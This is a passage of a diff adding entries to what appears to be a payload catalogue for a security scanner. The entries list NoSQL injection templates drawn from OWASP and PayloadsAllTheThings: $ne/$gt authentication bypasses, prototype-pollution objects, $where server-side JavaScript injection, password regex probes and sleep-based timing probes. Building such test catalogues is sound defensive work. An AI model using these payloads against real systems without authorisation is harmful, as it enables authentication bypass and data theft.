+    "description": "Spacing/Formatting probe from OWASP. Tests application handling of: { \"username\" : { \"$ne\" : null ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0163",
+    "name": "Spacing/Formatting #3",
+    "template": "{\"username\"  :  {\"$ne\"  :  null}}",
+    "description": "Spacing/Formatting probe from OWASP. Tests application handling of: {\"username\"  :  {\"$ne\"  :  nul...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0164",
+    "name": "Property Pollution",
+    "template": "{\"__proto__\": {\"admin\": true}}",
+    "description": "Property Pollution probe from OWASP. Tests application handling of: {\"__proto__\": {\"admin\": true}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0165",
+    "name": "Property Pollution #2",
+    "template": "{\"constructor\": {\"prototype\": {\"admin\": true}}}",
+    "description": "Property Pollution probe from OWASP. Tests application handling of: {\"constructor\": {\"prototype\": ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0166",
+    "name": "Server-Side JavaScript Injection (SSJI)",
+    "template": "'; return true; var dummy='",
+    "description": "Server-Side JavaScript Injection (SSJI) probe from OWASP. Tests application handling of: '; return true; var dummy='",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0167",
+    "name": "Server-Side JavaScript Injection (SSJI) #2",
+    "template": "\"; return true; var dummy=\"",
+    "description": "Server-Side JavaScript Injection (SSJI) probe from OWASP. Tests application handling of: \"; return true; var dummy=\"",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0168",
+    "name": "Server-Side JavaScript Injection (SSJI) #3",
+    "template": "'; var ret = this; return ret; var dummy='",
+    "description": "Server-Side JavaScript Injection (SSJI) probe from OWASP. Tests application handling of: '; var ret = this; return ret;...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0169",
+    "name": "Server-Side JavaScript Injection (SSJI) #4",
+    "template": "{\"$where\": \"function() { return true; }\"}",
+    "description": "Server-Side JavaScript Injection (SSJI) probe from OWASP. Tests application handling of: {\"$where\": \"function() { retur...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0170",
+    "name": "Server-Side JavaScript Injection (SSJI) #5",
+    "template": "{\"$where\": \"obj.credits - obj.price > 0\"}",
+    "description": "Server-Side JavaScript Injection (SSJI) probe from OWASP. Tests application handling of: {\"$where\": \"obj.credits - obj....",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-patt-0171",
+    "name": "Mongodb #1",
+    "template": "true, $where: '1 == 1'",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: true, $where: '1 == 1'",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0172",
+    "name": "Mongodb #2",
+    "template": ", $where: '1 == 1'",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: , $where: '1 == 1'",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0173",
+    "name": "Mongodb #3",
+    "template": "$where: '1 == 1'",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: $where: '1 == 1'",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0174",
+    "name": "Mongodb #4",
+    "template": "', $where: '1 == 1'",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: ', $where: '1 == 1'",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0175",
+    "name": "Mongodb #5",
+    "template": "1, $where: '1 == 1'",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: 1, $where: '1 == 1'",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0176",
+    "name": "Mongodb #6",
+    "template": "{ $ne: 1 }",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: { $ne: 1 }",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0177",
+    "name": "Mongodb #7",
+    "template": "', $or: [ {}, { 'a':'a",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: ', $or: [ {}, { 'a':'a",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0178",
+    "name": "Mongodb #8",
+    "template": "' } ], $comment:'successful MongoDB injection'",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: ' } ], $comment:'successful MongoDB inje...",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0179",
+    "name": "Mongodb #9",
+    "template": "db.injection.insert({success:1});",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: db.injection.insert({success:1});",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0180",
+    "name": "Mongodb #10",
+    "template": "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: db.injection.insert({success:1});return ...",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0181",
+    "name": "Mongodb #11",
+    "template": "|| 1==1",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: || 1==1",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0182",
+    "name": "Mongodb #12",
+    "template": "' && this.password.match(/.*/)//+%00",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: ' && this.password.match(/.*/)//+%00",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0183",
+    "name": "Mongodb #13",
+    "template": "' && this.passwordzz.match(/.*/)//+%00",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: ' && this.passwordzz.match(/.*/)//+%00",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0184",
+    "name": "Mongodb #14",
+    "template": "'%20%26%26%20this.password.match(/.*/)//+%00",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: '%20%26%26%20this.password.match(/.*/)//...",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0185",
+    "name": "Mongodb #15",
+    "template": "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: '%20%26%26%20this.passwordzz.match(/.*/)...",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0186",
+    "name": "Mongodb #16",
+    "template": "{$gt: ''}",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: {$gt: ''}",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0187",
+    "name": "Mongodb #17",
+    "template": "[$ne]=1",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: [$ne]=1",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0188",
+    "name": "Mongodb #18",
+    "template": "';return 'a'=='a' && ''=='",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: ';return 'a'=='a' && ''=='",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0189",
+    "name": "Mongodb #19",
+    "template": "\";return(true);var xyz='a",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: \";return(true);var xyz='a",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0190",
+    "name": "Mongodb #20",
+    "template": "0;return true",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Mongodb). Target: 0;return true",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "MongoDB.txt"
+  },
+  {
+    "id": "nosql-patt-0191",
+    "name": "Nosql #17",
+    "template": "{\"$gt\": \"\"}",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Nosql). Target: {\"$gt\": \"\"}",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "NoSQL.txt"
+  },
+  {
+    "id": "nosql-patt-0192",
+    "name": "Nosql #19",
+    "template": "';sleep(5000);",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Nosql). Target: ';sleep(5000);",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "NoSQL.txt"
+  },
+  {
+    "id": "nosql-patt-0193",
+    "name": "Nosql #21",
+    "template": "';sleep(5000);+'",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Nosql). Target: ';sleep(5000);+'",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "NoSQL.txt"
+  },
+  {
+    "id": "nosql-patt-0194",
+    "name": "Nosql #22",
+    "template": "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Nosql). Target: ';it=new%20Date();do{pt=new%20Date();}wh...",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "NoSQL.txt"
+  },
+  {
+    "id": "nosql-patt-0195",
+    "name": "Nosql #26",
+    "template": "{\"&exists\":false}",
+    "description": "NoSQL Injection payload from PayloadsAllTheThings (Nosql). Target: {\"&exists\":false}",
+    "enabled": true,
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "NoSQL.txt"
+  }
+]
